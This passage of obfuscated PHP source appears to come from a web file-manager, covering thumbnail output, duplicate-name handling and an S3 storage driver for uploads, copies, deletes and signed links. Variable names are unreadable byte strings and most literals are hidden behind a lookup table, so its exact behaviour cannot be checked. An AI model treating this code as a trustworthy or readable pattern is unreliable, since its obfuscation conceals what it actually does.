$¦ìŞƒ‹Å && $¼³ÔËŸî[$ÈÌÎ³ş›[172]] <= $¦ìŞƒ‹Å) { $›İú”­Ê = !0; } } $°×–¸«ó = $±ğôÖÆ©[$ÈÌÎ³ş›[170]][$ÈÌÎ³ş›[32]]; } if ($±ğôÖÆ©[$ÈÌÎ³ş›[76]] <= 1024 * 50 || $›İú”­Ê || !function_exists($ÈÌÎ³ş›[173]) || $±ğôÖÆ©[$ÈÌÎ³ş›[174]] == $ÈÌÎ³ş›[175]) { return $this->fileOut($ì”şÅ´°, !1, $°×–¸«ó); } if (isset($±ğôÖÆ©[$ÈÌÎ³ş›[170]][$ÈÌÎ³ş›[176]])) { $ƒ¨ìé®³ = $±ğôÖÆ©[$ÈÌÎ³ş›[170]][$ÈÌÎ³ş›[176]]; } else { if (isset($±ğôÖÆ©[$ÈÌÎ³ş›[170]][$ÈÌÎ³ş›[177]])) { $ƒ¨ìé®³ = $±ğôÖÆ©[$ÈÌÎ³ş›[170]][$ÈÌÎ³ş›[177]]; } } if (!$ƒ¨ìé®³) { $ƒ¨ìé®³ = md5("{$±ğôÖÆ©[$ÈÌÎ³ş›[32]]}\x5f{$±ğôÖÆ©[$ÈÌÎ³ş›[84]]}\x5f{$±ğôÖÆ©[$ÈÌÎ³ş›[76]]}\137{$¦ìŞƒ‹Å}"); } $ûÌõıå” = "{$ƒ¨ìé®³}\x5f{$¦ìŞƒ‹Å}\56\160\x6e\x67"; if (!($†ê‡Ì§ã = IO::fileNameExist(IO_PATH_SYSTEM_TEMP, $ÈÌÎ³ş›[178]))) { $Ïü¸ıÚ = IO::mkdir(IO_PATH_SYSTEM_TEMP . $ÈÌÎ³ş›[179]); } else { $Ïü¸ıÚ = KodIO::make($†ê‡Ì§ã); } if ($†ê‡Ì§ã = IO::fileNameExist($Ïü¸ıÚ, $ûÌõıå”)) { $©³Ë²„ = KodIO::make($†ê‡Ì§ã); return IO::fileOut($©³Ë²„, !1, $°×–¸«ó); } if (!is_dir(DATA_THUMB)) { mk_dir(DATA_THUMB); } $©³Ë²„ = DATA_THUMB . $ûÌõıå”; del_file($©³Ë²„); if (!@file_exists($©³Ë²„)) { $Å ª¸ìõ = TEMP_FILES; if (!is_dir($Å ª¸ìõ)) { mk_dir($Å ª¸ìõ); } $Óœ‰Ä«· = $Å ª¸ìõ . $ƒ¨ìé®³ . $ÈÌÎ³ş›[10] . $±ğôÖÆ©[$ÈÌÎ³ş›[174]]; if (!@file_exists($Óœ‰Ä«·)) { $Óœ‰Ä«· = $this->download($ì”şÅ´°, $Óœ‰Ä«·); } ImageThumb::createThumb($Óœ‰Ä«·, $©³Ë²„, $¦ìŞƒ‹Å, $¦ìŞƒ‹Å * 10); } if (!file_exists($©³Ë²„) || filesize($©³Ë²„) < 100) { return @file_exists($Óœ‰Ä«·) ? IO::fileOut($Óœ‰Ä«·) : $this->fileOut($ì”şÅ´°); } if (!($ÖøÊü· = IO::move($©³Ë²„, $Ïü¸ıÚ))) { return IO::fileOut($©³Ë²„); } del_file($©³Ë²„); IO::fileOut($ÖøÊü·); } public function fileOutImageServer($£ã»ëÎ, $ıôù»Åà = 250) { $this->fileOutImage($£ã»ëÎ, $ıôù»Åà); } public function fileNameAuto($áÜ®ê¼´, $í´«ïù, $Ş²şÌŠÄ = REPEAT_RENAME, $ªô´˜æ‹ = false) { $ÊËÛÍ™ß =& $_SERVER[…É¦À–]; $æ´¥ÚŸ = $áÜ®ê¼´ === $ÊËÛÍ™ß[12] ? $í´«ïù : rtrim($áÜ®ê¼´, $ÊËÛÍ™ß[8]) . $ÊËÛÍ™ß[8] . $í´«ïù; if ($Ş²şÌŠÄ == REPEAT_REPLACE || !$this->exist($æ´¥ÚŸ) || $ªô´˜æ‹ && $Ş²şÌŠÄ != REPEAT_RENAME_FOLDER) { return $í´«ïù; } if ($Ş²şÌŠÄ == REPEAT_SKIP) { return !1; } $ÍŠ Ô‘Î = $ÊËÛÍ™ß[10] . get_path_ext($í´«ïù); $ÍŠ Ô‘Î = $ÍŠ Ô‘Î == $ÊËÛÍ™ß[10] || $ªô´˜æ‹ ? $ÊËÛÍ™ß[12] : $ÍŠ Ô‘Î; $®öË¼š = 1; $éÕùå°ï = substr($í´«ïù, 0, strlen($í´«ïù) - strlen($ÍŠ Ô‘Î)); $Š¼½©ä = $éÕùå°ï . "\50{$®öË¼š}\x29{$ÍŠ Ô‘Î}"; while ($this->exist(rtrim($áÜ®ê¼´, $ÊËÛÍ™ß[8]) . $ÊËÛÍ™ß[8] . $Š¼½©ä)) { $Š¼½©ä = $éÕùå°ï . "\x28{$®öË¼š}\51{$ÍŠ Ô‘Î}"; $®öË¼š++; } return $Š¼½©ä; } private function fileNameAutoList($áŞÉ¸Û¾, $ÛŒËêì¡, $¶À‰ğˆ¢ = false) { $€˜œÖ¸ =& $_SERVER[…É¦À–]; $Ú¹éÖùÕ = $this->listPath($áŞÉ¸Û¾, !0); $Ú¹éÖùÕ = array_merge($Ú¹éÖùÕ[$€˜œÖ¸[82]], $Ú¹éÖùÕ[$€˜œÖ¸[83]]); $ŒÇğ”¾ = array_to_keyvalue($Ú¹éÖùÕ, $€˜œÖ¸[12], $€˜œÖ¸[32]); $±œ‹Öü = $€˜œÖ¸[10] . get_path_ext($ÛŒËêì¡); $±œ‹Öü = $±œ‹Öü == $€˜œÖ¸[10] || $¶À‰ğˆ¢ ? $€˜œÖ¸[12] : $±œ‹Öü; $»çÎËÏì = substr($ÛŒËêì¡, 0, strlen($ÛŒËêì¡) - strlen($±œ‹Öü)); $Óæô»¯ì = $»çÎËÏì . "\x28\60\x29{$±œ‹Öü}"; for ($˜±˜éÎ‡ = 1; $˜±˜éÎ‡ <= count($ŒÇğ”¾) + 1; $˜±˜éÎ‡++) { $Óæô»¯ì = $»çÎËÏì . "\x28{$˜±˜éÎ‡}\51{$±œ‹Öü}"; if (!in_array_not_case($Óæô»¯ì, $ŒÇğ”¾)) { return $Óæô»¯ì; } } return $Óæô»¯ì; } public function listAllFiles($Ñ¼°ÀëĞ, $ôÆ®°â) { $¸¢Ä»…œ =& $_SERVER[…É¦À–]; if (empty($ôÆ®°â)) { return array(); } $ı–ª§†à = array_keys($ôÆ®°â); $üÌ×ıæ = array(); $Ñ¼°ÀëĞ = trim($Ñ¼°ÀëĞ, $¸¢Ä»…œ[8]); foreach ($ôÆ®°â as $è­ƒ”Â => $¿«Ó¯°ì) { $ØÓ¹ú = ltrim(substr(trim($è­ƒ”Â, $¸¢Ä»…œ[8]), strlen($Ñ¼°ÀëĞ)), $¸¢Ä»…œ[8]); if (substr($è­ƒ”Â, -1) == $¸¢Ä»…œ[8]) { $ØÓ¹ú = rtrim($ØÓ¹ú, $¸¢Ä»…œ[8]) . $¸¢Ä»…œ[8]; } $üÌ×ıæ = array_merge($üÌ×ıæ, $this->slicePath($ØÓ¹ú)); } $×ùñ¬Úš = array(); foreach (array_unique($üÌ×ıæ) as $ÀéÆ³îí) { $ª•Ñöî = array($¸¢Ä»…œ[84] => $this->getPathOuter($¸¢Ä»…œ[8] . $Ñ¼°ÀëĞ . $¸¢Ä»…œ[8] . $ÀéÆ³îí), $¸¢Ä»…œ[75] => 1, $¸¢Ä»…œ[76] => 0); if (substr($ÀéÆ³îí, -1) != $¸¢Ä»…œ[8]) { $ª•Ñöî[$¸¢Ä»…œ[75]] = 0; $ô Ï»Ñ× = $this->getPath($Ñ¼°ÀëĞ . $¸¢Ä»…œ[8] . $ÀéÆ³îí); if (isset($ôÆ®°â[$ô Ï»Ñ×])) { $¦Ğ†™ı± = $ôÆ®°â[$ô Ï»Ñ×]; if (isset($¦Ğ†™ı±[$¸¢Ä»…œ[76]])) { $ª•Ñöî[$¸¢Ä»…œ[76]] = intval($¦Ğ†™ı±[$¸¢Ä»…œ[76]]); } if (isset($¦Ğ†™ı±[$¸¢Ä»…œ[180]])) { $ª•Ñöî[$¸¢Ä»…œ[85]] = intval($¦Ğ†™ı±[$¸¢Ä»…œ[180]]); } } } $×ùñ¬Úš[] = $ª•Ñöî; } return $×ùñ¬Úš; } public function slicePath($…†¹šÖ™) { $ñï°ç–Š =& $_SERVER[…É¦À–]; $ê‚ÖÒë = explode($ñï°ç–Š[8], trim($…†¹šÖ™, $ñï°ç–Š[8])); $Í±í¶æÓ = 0; do { ++$Í±í¶æÓ; $—ö·øÈ[] = implode($ñï°ç–Š[8], array_slice($ê‚ÖÒë, 0, $Í±í¶æÓ)) . $ñï°ç–Š[8]; } while ($Í±í¶æÓ < count($ê‚ÖÒë)); $—ö·øÈ[count($ê‚ÖÒë) - 1] = $…†¹šÖ™; return $—ö·øÈ; } public function getHost() { $ğ¨ˆØÔ =& $_SERVER[…É¦À–]; $¦÷şÄÈß = parse_url(trim($this->domain, $ğ¨ˆØÔ[8])); $Ğ¼³×Ø’ = isset($¦÷şÄÈß[$ğ¨ˆØÔ[181]]) ? $¦÷şÄÈß[$ğ¨ˆØÔ[181]] : http_type(); $Ğ×€Óü = isset($¦÷şÄÈß[$ğ¨ˆØÔ[182]]) ? $¦÷şÄÈß[$ğ¨ˆØÔ[182]] : $¦÷şÄÈß[$ğ¨ˆØÔ[84]]; if (isset($¦÷şÄÈß[$ğ¨ˆØÔ[183]])) { $Ğ×€Óü .= $ğ¨ˆØÔ[4] . $¦÷şÄÈß[$ğ¨ˆØÔ[183]]; } return $Ğ¼³×Ø’ . $ğ¨ˆØÔ[184] . $Ğ×€Óü; } public function pathEncode($Å‡ÙÖ¤â) { $È¥Ä«Â =& $_SERVER[…É¦À–]; return str_replace($È¥Ä«Â[185], $È¥Ä«Â[8], rawurlencode($Å‡ÙÖ¤â)); } } class PathDriverBaseS3 extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $useSSL = false; protected $region = ''; protected $endpoint = ''; protected $bucket = ''; protected $client = null; protected $signVer = "\x76\64"; public $ioUploadServer = "\60"; public $ioFileOutServer = "\x30"; public $config = array(); public function __construct($Üå€é•ä) { set_timeout(); require_once SDK_DIR . $_SERVER[…É¦À–][186]; parent::__construct(); $this->_init($Üå€é•ä); } public function _init($ƒ®ø²îó) { $this->config = $ƒ®ø²îó; foreach ($ƒ®ø²îó as $›ïØÚıÀ => $Šú‰ä‘Ù) { if (isset($this->{$›ïØÚıÀ})) { $this->{$›ïØÚıÀ} = $Šú‰ä‘Ù; } } $this->endpoint = $ƒ®ø²îó[$_SERVER[…É¦À–][187]]; $this->client = new S3($this->accessKey, $this->secret, $this->useSSL, $this->endpoint, $this->region); $this->client->setEndpoint($this->getHost()); } public function signatureVersion($İòí„Öî = "\166\x34") { $this->signVer = $İòí„Öî; $this->client->setSignatureVersion($İòí„Öî); } public function setBucketCors() { return $this->client->setBucketCors($this->bucket); } public function getBucketCors() { return $this->client->getBucketCors($this->bucket); } public function isBucketCors() { $³¾–¶½¿ =& $_SERVER[…É¦À–]; $¥÷Œë—¯ = $this->getBucketCors(); if (!$¥÷Œë—¯ || !is_array($¥÷Œë—¯)) { return !1; } if ($¥÷Œë—¯[$³¾–¶½¿[188]] != $³¾–¶½¿[189] || $¥÷Œë—¯[$³¾–¶½¿[190]] != $³¾–¶½¿[189]) { return !1; } $òõí ¯€ = array_map($³¾–¶½¿[191], $¥÷Œë—¯[$³¾–¶½¿[192]]); if (!is_array($òõí ¯€)) { $òõí ¯€ = array(); } $›ñ±…–Õ = array($³¾–¶½¿[193], $³¾–¶½¿[194], $³¾–¶½¿[195], $³¾–¶½¿[196], $³¾–¶½¿[197]); $·æòòıÔ = array_diff($›ñ±…–Õ, $òõí ¯€); return empty($·æòòıÔ); } public function mkfile($«á¯‰¬­, $¬Éºş‰ = '', $«è»Ï¢ = REPEAT_RENAME) { $’¬•¤ = $this->setContent($«á¯‰¬­, $¬Éºş‰); if ($’¬•¤ !== !1) { return $this->getPathOuter($«á¯‰¬­); } return !1; } public function mkdir($šˆ™ÉÍÀ, $éèÀ¼ûŸ = REPEAT_SKIP) { $æİ›ˆæ˜ =& $_SERVER[…É¦À–]; if (empty($šˆ™ÉÍÀ) && $šˆ™ÉÍÀ !== $æİ›ˆæ˜[198]) { return !1; } if ($éèÀ¼ûŸ && $this->_isFolder($šˆ™ÉÍÀ)) { return $this->getPathOuter($šˆ™ÉÍÀ); } $Îçœñ¥æ = $this->setContent($šˆ™ÉÍÀ, $æİ›ˆæ˜[12], !0); if ($Îçœñ¥æ !== !1) { return $this->getPathOuter($šˆ™ÉÍÀ); } return !1; } public function copyFile($Æ¤£éÕ, $æ¼Ò¨, $¯÷‡¸³ = array()) { $úåå´®² =& $_SERVER[…É¦À–]; $ğÉ ĞŠ  = $this->objectMeta($Æ¤£éÕ); if (!$ğÉ ĞŠ ) { return !1; } if ($ğÉ ĞŠ [$úåå´®²[76]] <= 1024 * 1024 * 200) { $¢«¨¾€ = $this->client->copyObject($this->bucket, $Æ¤£éÕ, $this->bucket, $æ¼Ò¨, $úåå´®²[199], $¯÷‡¸³); } else { $¢«¨¾€ = $this->client->multiCopyObject($this->bucket, $Æ¤£éÕ, $this->bucket, $æ¼Ò¨, $¯÷‡¸³); } $¢«¨¾€ = $¢«¨¾€ ? $this->getPathOuter($æ¼Ò¨) : !1; return $¢«¨¾€; } public function moveFile($“¦Î¡é­, $úã…íßŞ) { if ($this->copyFile($“¦Î¡é­, $úã…íßŞ)) { $this->delFile($“¦Î¡é­); return $this->getPathOuter($úã…íßŞ); } return !1; } public function delFile($ı•¿˜Ğè) { return $this->client->deleteObject($this->bucket, $ı•¿˜Ğè); } public function delFolder($À×ıÔÕÍ) { $ĞÇÄ¨ø„ =& $_SERVER[…É¦À–]; if (!$this->exist($À×ıÔÕÍ)) { return !0; } $this->listItemCache = !1; $Ğ•òç×Ú = $this->fileList($À×ıÔÕÍ); $this->listItemCache = !0; $øüÛÆèû = trim($À×ıÔÕÍ, $ĞÇÄ¨ø„[8]) . $ĞÇÄ¨ø„[8]; if (!empty($À×ıÔÕÍ) && $À×ıÔÕÍ !== $ĞÇÄ¨ø„[198] && !in_array($øüÛÆèû, $Ğ•òç×Ú[$ĞÇÄ¨ø„[82]])) { $Ğ•òç×Ú[$ĞÇÄ¨ø„[82]][] = $øüÛÆèû; } $ˆŞ™àµ = $this->delByBatch($Ğ•òç×Ú[$ĞÇÄ¨ø„[83]]); if (!$ˆŞ™àµ) { return !1; } $ˆŞ™àµ = $this->delByBatch($Ğ•òç×Ú[$ĞÇÄ¨ø„[82]]); if (!$ˆŞ™àµ) { return !1; } return $this->delFile($øüÛÆèû); } private function delByBatch($Ò®î—ğÒ) { foreach (array_chunk($Ò®î—ğÒ, 1000) as $œûÓ­¾) { $’éàÏú = $this->client->deleteObjects($this->bucket, $œûÓ­¾); if (!$’éàÏú) { return !1; } } return !0; } public function rename($Â—°ìƒó, $‡©‘î•¾) { return $this->renameObject($Â—°ìƒó, $‡©‘î•¾); } public function listPath($Äì“ßÅé, $µã¦èÔã = false) { $§ñÙ©§ =& $_SERVER[…É¦À–]; $µøİúÓ = $this->fileList($Äì“ßÅé, $§ñÙ©§[8], !0); foreach ($µøİúÓ[$§ñÙ©§[82]] as $¢¸ËİÌ¸ => $¨ØıôÔÕ) { $µøİúÓ[$§ñÙ©§[82]][$¢¸ËİÌ¸] = $this->folderInfo($¨ØıôÔÕ, $µã¦èÔã, $¨ØıôÔÕ); } foreach ($µøİúÓ[$§ñÙ©§[83]] as $¢¸ËİÌ¸ => $¨ØıôÔÕ) { $µøİúÓ[$§ñÙ©§[83]][$¢¸ËİÌ¸] = $this->fileInfo($¨ØıôÔÕ[$§ñÙ©§[32]], $µã¦èÔã, $¨ØıôÔÕ); } return $µøİúÓ; } protected function infoChildren($¿¡øìº, &$…œø¼¥ò) { $àÕ„ú =& $_SERVER[…É¦À–]; $äÈú¼¿ö = $this->fileList($¿¡øìº, $àÕ„ú[12], !0); $…œø¼¥ò[$àÕ„ú[78]] += count($äÈú¼¿ö[$àÕ„ú[82]]); $…œø¼¥ò[$àÕ„ú[77]] += count($äÈú¼¿ö[$àÕ„ú[83]]); foreach ($äÈú¼¿ö[$àÕ„ú[83]] as $ªÒğ˜¦) { if (!$ªÒğ˜¦ || !$ªÒğ˜¦[$àÕ„ú[76]]) { continue; } $…œø¼¥ò[$àÕ„ú[76]] += $ªÒğ˜¦[$àÕ„ú[76]]; } } private function fileInfo($åİøß¿†, $²ÀÀ‰É¿ = false, $¬â¾Ãö = array()) { $ÀâÀ¹¿Ô =& $_SERVER[…É¦À–]; $³êÍ’£š = array($ÀâÀ¹¿Ô[32] => $this->pathThis($åİøß¿†), $ÀâÀ¹¿Ô[84] => $this->getPathOuter($åİøß¿†), $ÀâÀ¹¿Ô[33] => $ÀâÀ¹¿Ô[200], $ÀâÀ¹¿Ô[174] => $this->ext($åİøß¿†), $ÀâÀ¹¿Ô[76] => isset($¬â¾Ãö[$ÀâÀ¹¿Ô[76]]) ? $¬â¾Ãö[$ÀâÀ¹¿Ô[76]] : 0); if ($²ÀÀ‰É¿) { return $³êÍ’£š; } $³êÍ’£š[$ÀâÀ¹¿Ô[201]] = $³êÍ’£š[$ÀâÀ¹¿Ô[85]] = 0; $³êÍ’£š[$ÀâÀ¹¿Ô[202]] = $³êÍ’£š[$ÀâÀ¹¿Ô[203]] = !0; if (empty($¬â¾Ãö)) { $¬â¾Ãö = $this->objectMeta($åİøß¿†); if (!$¬â¾Ãö) { return $³êÍ’£š; } } if (isset($¬â¾Ãö[$ÀâÀ¹¿Ô[180]])) { $³êÍ’£š[$ÀâÀ¹¿Ô[85]] = $¬â¾Ãö[$ÀâÀ¹¿Ô[180]]; } if (isset($¬â¾Ãö[$ÀâÀ¹¿Ô[76]])) { $³êÍ’£š[$ÀâÀ¹¿Ô[76]] = $¬â¾Ãö[$ÀâÀ¹¿Ô[76]]; } return $³êÍ’£š; } private function folderInfo($…ßÙº™§, $ÕŸ£ªµ = false, $­Ø†÷µ‚ = array()) { $æ¥©­¹° =& $_SERVER[…É¦À–]; $—±µ­×ş = array($æ¥©­¹°[32] => $this->pathThis($…ßÙº™§), $æ¥©­¹°[84] => $this->getPathOuter($æ¥©­¹°[8] . $…ßÙº™§), $æ¥©­¹°[33] => $æ¥©­¹°[75]); if ($ÕŸ£ªµ) { return $—±µ­×ş; } $—±µ­×ş[$æ¥©­¹°[201]] = $—±µ­×ş[$æ¥©­¹°[85]] = 0; $—±µ­×ş[$æ¥©­¹°[202]] = $—±µ­×ş[$æ¥©­¹°[203]] = !0; if ($…ßÙº™§ == $æ¥©­¹°[12]) { return $—±µ­×ş; } if (empty($­Ø†÷µ‚)) { $­Ø†÷µ‚ = $this->objectMeta(trim($…ßÙº™§, $æ¥©­¹°[8]) . $æ¥©­¹°[8]); } if (isset($­Ø†÷µ‚[$æ¥©­¹°[180]])) { $—±µ­×ş[$æ¥©­¹°[201]] = $­Ø†÷µ‚[$æ¥©­¹°[180]]; } return $—±µ­×ş; } private function fileList($Ñ¥Ü£ï§, $Ş¿‰ÏŸê = '', $ÅÇŒÕÅ = 0) { $®„šˆğé =& $_SERVER[…É¦À–]; $ª•¤²¥¼ = rtrim($Ñ¥Ü£ï§, $®„šˆğé[8]) . $®„šˆğé[8]; $Ğ¥û§ôÎ = $this->listObjs($ª•¤²¥¼, null, null, $Ş¿‰ÏŸê); if (!$Ğ¥û§ôÎ) { return array($®„šˆğé[82] => array(), $®„šˆğé[83] => array()); } $ëƒêÚü³ = $…Ôó±£ = array(); foreach ($Ğ¥û§ôÎ[$®„šˆğé[204]] as $Äşí…¡†) { $…ë£†è = $Äşí…¡†[$®„šˆğé[32]]; if ($…ë£†è == $ª•¤²¥¼) { continue; } $Û«üÂò = isset($Äşí…¡†[$®„šˆğé[76]]) ? $Äşí…¡†[$®„šˆğé[76]] : 0; $âõÙÔ¨¾ = $Û«üÂò == 0 && substr($…ë£†è, strlen($…ë£†è) - 1, 1) == $®„šˆğé[8] ? !0 : !1; $this->cacheMethodInfoSet($…ë£†è, $âõÙÔ¨¾, $Äşí…¡†); if ($âõÙÔ¨¾) { $ëƒêÚü³[] = $…ë£†è; continue; } $…Ôó±£[] = $ÅÇŒÕÅ ? $Äşí…¡† : $…ë£†è; } foreach ($Ğ¥û§ôÎ[$®„šˆğé[205]] as $Äşí…¡†) { $ëƒêÚü³[] = $Äşí…¡†[$®„šˆğé[32]]; $this->cacheMethodInfoSet($Äşí…¡†[$®„šˆğé[32]], !0); } $this->cacheMethodInfoSet($Ñ¥Ü£ï§, !0); return array($®„šˆğé[82] => $ëƒêÚü³, $®„šˆğé[83] => $…Ôó±£); } private function listObjs($Ğİ—û‘, $Âˆ”çŸ¤ = null, $˜Çƒ’•ˆ = null, $†„êÍ = null) { $ˆø¦Œ¶Ô =& $_SERVER[…É¦À–]; $Ğİ—û‘ = trim($Ğİ—û‘, $ˆø¦Œ¶Ô[8]); $ìçÇçòú = empty($Ğİ—û‘) && $Ğİ—û‘ !== $ˆø¦Œ¶Ô[198] ? $ˆø¦Œ¶Ô[12] : $Ğİ—û‘ . $ˆø¦Œ¶Ô[8]; return $this->client->getBucket($this->bucket, $ìçÇçòú, $Âˆ”çŸ¤, $˜Çƒ’•ˆ, $†„êÍ, !0); } public function has($“ç½á©¤, $Ç —„µ• = false, $ñ¼”ÃÃ™ = true) { $•ÙÂòÔŠ =& $_SERVER[…É¦À–]; $“ç½á©¤ = trim($“ç½á©¤, $•ÙÂòÔŠ[8]); $û‘£òİ€ = empty($“ç½á©¤) && $“ç½á©¤ !== $•ÙÂòÔŠ[198] ? $•ÙÂòÔŠ[12] : $“ç½á©¤ . $•ÙÂòÔŠ[8]; $ÃéÙô¶ = null; $¾ºŞ§Ş = 500; $»¢Î¶ú = $•ÙÂòÔŠ[8]; $€¶‰ŞÛ³ = $û«”âèœ = array(); while (!0) { $ĞÊ¶ò² = $this->listObjs($“ç½á©¤, $ÃéÙô¶, $¾ºŞ§Ş, $»¢Î¶ú); if (!$ĞÊ¶ò²) { break; } $ÃéÙô¶ = $ĞÊ¶ò²[$•ÙÂòÔŠ[206]]; $…›¶¯—á = $ĞÊ¶ò²[$•ÙÂòÔŠ[204]]; $•òØ†Šç = $ĞÊ¶ò²[$•ÙÂòÔŠ[205]]; if (empty($…›¶¯—á) && empty($•òØ†Šç)) { break; } if (count($…›¶¯—á) == 1 && $…›¶¯—á[0][$•ÙÂòÔŠ[32]] == $û‘£òİ€) { break; } if ($Ç —„µ•) { if (count($…›¶¯—á)) { $…›¶¯—á = array_column($…›¶¯—á, $•ÙÂòÔŠ[32]); $€¶‰ŞÛ³ = array_merge($€¶‰ŞÛ³, $…›¶¯—á); } if (count($•òØ†Šç)) { $•òØ†Šç = array_column($•òØ†Šç, $•ÙÂòÔŠ[32]); $û«”âèœ = array_merge($û«”âèœ, $•òØ†Šç); } if ($ÃéÙô¶ === null) { break; } continue; } if ($ñ¼”ÃÃ™) { if (!empty($…›¶¯—á)) { if (count($…›¶¯—á) > 1 || isset($…›¶¯—á[0][$•ÙÂòÔŠ[32]]) && $…›¶¯—á[0][$•ÙÂòÔŠ[32]] != $û‘£òİ€) { return !0; } } } else { if (!empty($•òØ†Šç)) { return !0; } } if ($ÃéÙô¶ === null) { break; } } if ($Ç —„µ•) { $€¶‰ŞÛ³ = array_diff($€¶‰ŞÛ³, array($û‘£òİ€)); $€¶‰ŞÛ³ = count(array_unique($€¶‰ŞÛ³)); $û«”âèœ = count(array_unique($û«”âèœ)); return array($•ÙÂòÔŠ[207] => $€¶‰ŞÛ³, $•ÙÂòÔŠ[208] => $û«”âèœ); } return !1; } public function listAll($ùí¾âŸ•) { $ÍÉ€áúş =& $_SERVER[…É¦À–]; $šå•Â·Œ = $this->fileList($ùí¾âŸ•, $ÍÉ€áúş[12], !0); $ôê´Â¸· = array_to_keyvalue($šå•Â·Œ[$ÍÉ€áúş[83]], $ÍÉ€áúş[32]); foreach ($šå•Â·Œ[$ÍÉ€áúş[82]] as $àÒˆ°×) { if (is_string($àÒˆ°×)) { $ôê´Â¸·[$àÒˆ°×] = array($ÍÉ€áúş[76] => 0); } } return $this->listAllFiles($ùí¾âŸ•, $ôê´Â¸·); } public function canRead($Æ–õ“è) { $¨Ş°ñæ’ =& $_SERVER[…É¦À–]; $¤ëÉÎª = $this->client->getAccessControlPolicy($this->bucket, $Æ–õ“è); if (!$¤ëÉÎª) { return !1; } return in_array($¤ëÉÎª, array($¨Ş°ñæ’[209], $¨Ş°ñæ’[210], $¨Ş°ñæ’[211])) ? !0 : !1; } public function canWrite($ùÀï§‘Á) { $ØòİŒ“Ÿ =& $_SERVER[…É¦À–]; $£Úò±ïõ = $this->client->getAccessControlPolicy($this->bucket, $ùÀï§‘Á); if (!$£Úò±ïõ) { return !1; } return in_array($£Úò±ïõ, array($ØòİŒ“Ÿ[209], $ØòİŒ“Ÿ[210])) ? !0 : !1; } public function getContent($æ¯ûâ²) { return $this->client->getObject($this->bucket, $æ¯ûâ²); } public function setContent($ Î­€ßÉ, $·íù£ÎŒ = '', $‹Æù¶ó = false) { $ªşåÄ¡ó =& $_SERVER[…É¦À–]; $ Î­€ßÉ = $‹Æù¶ó ? trim($ Î­€ßÉ, $ªşåÄ¡ó[8]) . $ªşåÄ¡ó[8] : $ Î­€ßÉ; $Õ¸Ş†¨ê = get_file_mime(get_path_ext($ Î­€ßÉ)); $Óñ¦Óœã = $this->client->putObject($·íù£ÎŒ, $this->bucket, $ Î­€ßÉ, $ªşåÄ¡ó[199], array(), $Õ¸Ş†¨ê); if (!$Óñ¦Óœã) { return !1; } if ($‹Æù¶ó) { return !0; } $this->cacheMethod(null, null); $Óñ¦Óœã = $this->copyFile($ Î­€ßÉ, $ Î­€ßÉ, array($ªşåÄ¡ó[212] => $Óñ¦Óœã[$ªşåÄ¡ó[213]])); return $Óñ¦Óœã ? !0 : !1; } public function fileSubstr($şÕš³ıê, $Ïà¡×ÕØ, $îã¯‹°) { $„û’õ¶ú = $Ïà¡×ÕØ + $îã¯‹° - 1; return $this->client->getObject($this->bucket, $şÕš³ıê, array($_SERVER[…É¦À–][214] => "\142\171\164\145\x73\75{$Ïà¡×ÕØ}\x2d{$„û’õ¶ú}")); } public function upload($Á…æİÃÂ, $íúÒÅ±±, $×ê¡­Öş = false, $Òİˆ© ä = REPEAT_REPLACE) { $¤Ğ…îı” =& $_SERVER[…É¦À–]; $ÛÜª‚¦Ã = array($¤Ğ…îı”[212] => @md5_file($íúÒÅ±±)); $ÂúÙ÷¹÷ = array($¤Ğ…îı”[215] => get_file_mime(get_path_ext($Á…æİÃÂ))); if (IO::size($íúÒÅ±±) <= 1024 * 1024 * 200) { $°ú«°£ù = $this->client->putObjectFile($íúÒÅ±±, $this->bucket, $Á…æİÃÂ, $¤Ğ…îı”[199], $ÛÜª‚¦Ã, $ÂúÙ÷¹÷); return !empty($°ú«°£ù) ? $this->getPathOuter($Á…æİÃÂ) : !1; } $õĞ¯ÉÚ§ = $this->client->multiUploadObject($íúÒÅ±±, $this->bucket, trim($Á…æİÃÂ, $¤Ğ…îı”[8]), $ÛÜª‚¦Ã, $ÂúÙ÷¹÷); return $õĞ¯ÉÚ§ ? $this->getPathOuter($Á…æİÃÂ) : !1; } public function download($¨Ø¦¼Ä³, $óã‰šÎ¢) { if (!@is_dir($this->pathFather($óã‰šÎ¢)) && !IO::mkdir($this->pathFather($óã‰šÎ¢))) { return !1; } $é¥ïöÄû = $this->client->getObject($this->bucket, $¨Ø¦¼Ä³, array(), $óã‰šÎ¢); return $é¥ïöÄû !== !1 ? $óã‰šÎ¢ : !1; } public function link($´Í·ø¾, $ˆ¿À‹ÁÉ = array()) { $×Ó ¼ê =& $_SERVER[…É¦À–]; if ($this->signVer == $×Ó ¼ê[216]) { return $this->client->getAuthenticatedURL($this->bucket, $´Í·ø¾, 3600 * 12, $ˆ¿À‹ÁÉ); } return $this->client->getObjectUrl($this->accessKey, $this->secret, $this->bucket, trim($´Í·ø¾, $×Ó ¼ê[8]), 3600 * 12, $this->region, array(), !0, $ˆ¿À‹ÁÉ); } public function fileOut($Ş†”ëèù, $ÁªÑ‚š… = false, $á¿ñ–ø³ = false, $÷…ƒºØ = '') { $×à®ÌŞï =& $_SERVER[…É¦À–]; if ($this->isFileOutServer()) { return $this->fileOutServer($Ş†”ëèù, $ÁªÑ‚š…, $á¿ñ–ø³, $÷…ƒºØ); } if (!$á¿ñ–ø³) { $á¿ñ–ø³ = $this->pathThis($Ş†”ëèù); } $†Çï’® = get_file_mime(get_path_ext($á¿ñ–ø³)); if ($†Çï’® == $×à®ÌŞï[217]) { return parent::fileOut($Ş†”ëèù, $ÁªÑ‚š…, $á¿ñ–ø³, $÷…ƒºØ); } $Ï÷ªèÚÌ = array($×à®ÌŞï[218] => $†Çï’®); if ($ÁªÑ‚š…) { $Ï÷ªèÚÌ[$×à®ÌŞï[219]] = $×à®ÌŞï[220] . rawurlencode($á¿ñ–ø³); } else { } $û±ĞÌ¯¨ = $this->link($Ş†”ëèù, $Ï÷ªèÚÌ); $this->fileOutLink($û±ĞÌ¯¨); } public function fileOutServer($±”ôÓÑœ, $®óÈä®Õ = false, $º¢Âà£ş = false, $ŠÕáòøè = '') { parent::fileOut($±”ôÓÑœ, $®óÈä®Õ, $º¢Âà£ş, $ŠÕáòøè); } public function fileOutImageServer($Üê¡ôí, $¢ûë«œ = 250) { parent::fileOutImage($Üê¡ôí, $¢ûë«œ); } public function hashMd5($åøµšâ, $©¦”¯“ = '') { $›ÏŠ =& $_SERVER[…É¦À–]; $Èò‡å»ë = $this->objectMeta($åøµšâ); if (!$Èò‡å»ë) { return !1; } $©¦”¯“ = $©¦”¯“ ? $©¦”¯“ : _get($Èò‡å»ë, $›ÏŠ[221]); 